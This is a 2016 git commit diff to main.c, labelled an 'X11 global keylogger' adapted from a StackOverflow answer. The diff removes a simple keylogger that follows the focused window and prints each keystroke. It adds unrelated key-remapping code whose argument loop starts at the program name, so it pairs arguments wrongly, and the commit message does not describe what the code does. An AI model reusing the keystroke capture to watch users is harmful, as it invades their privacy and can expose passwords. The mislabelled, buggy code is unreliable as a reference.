9e25d8eec8a1523eaeffa6cf69bb4c6f90ab04f6
nefanov <nefanov90@gmail.com>
2016-10-04 23:46:46 +0300

    X11 global keylogger (REFACTORED FROM http://stackoverflow.com/questions/22749444/listening-to-keyboard-events-without-consuming-them-in-x11-keyboard-hooking)

--- main.c
+++ main.c
@@ -1,58 +1,26 @@
-#include <X11/X.h>
+#include <stdio.h>
 #include <X11/Xlib.h>
 #include <X11/Xutil.h>
+#include <X11/Xatom.h>
+#include <X11/keysym.h>
 
-#include <stdio.h>
-#include <ctype.h>
-
-
-int main ()
-{
-    Display* d = XOpenDisplay(NULL);
-    Window root = DefaultRootWindow(d);
-    Window curFocus;
-    char buf[17];
-    KeySym ks;
-    XComposeStatus comp;
-    int len, revert;
-
-    XGetInputFocus (d, &curFocus, &revert);
-    XSelectInput(d, curFocus, KeyReleaseMask|FocusChangeMask);
-
-    for(;;)
-    {
-        XEvent event;
-        XNextEvent(d, &event);
-        switch (event.type)
-        {
-            case FocusOut:
-                printf ("Focus changed!\n");
-                printf ("Old focus is %d\n", (int)curFocus);
-                if (curFocus != root)
-                    XSelectInput(d, curFocus, 0);
-                XGetInputFocus (d, &curFocus, &revert);
-                printf ("New focus is %d\n", (int)curFocus);
-                if (curFocus == PointerRoot)
-                    curFocus = root;
-                XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
-                break;
-
-            case KeyPress:
-
-                printf ("Got key!\n");
-                len = XLookupString(&event.xkey, buf, 16, &ks, &comp);
-                if (len > 0 && isprint(buf[0]))
-                {
-                    buf[len]=0; // set last byte as null-terminator
-                    printf("String is: %s\n", buf);
-                }
-                else //KeyReleased
-                {
-                    printf ("Key is: %d\n", (int)ks);
-                }
-
-        }
-
+int main(int argc, char **argv) {
+    KeySym old, new;
+    int old_code;
+    Display *display;
+    if (!(display = XOpenDisplay("")) ) {
+        fprintf(stderr, "Can't open display %s\n", XDisplayName(""));
+        return 1;
     }
+
+    while (argc > 1) {
+        old = XStringToKeysym(*argv++);
+        new = XStringToKeysym(*argv++);
+        argc--, argc--;
+        old_code = XKeysymToKeycode(display, old);
+        XChangeKeyboardMapping(display, old_code, 1, &new, 1);
+    }
+    XFlush(display);
+    XCloseDisplay(display);
     return 0;
 }
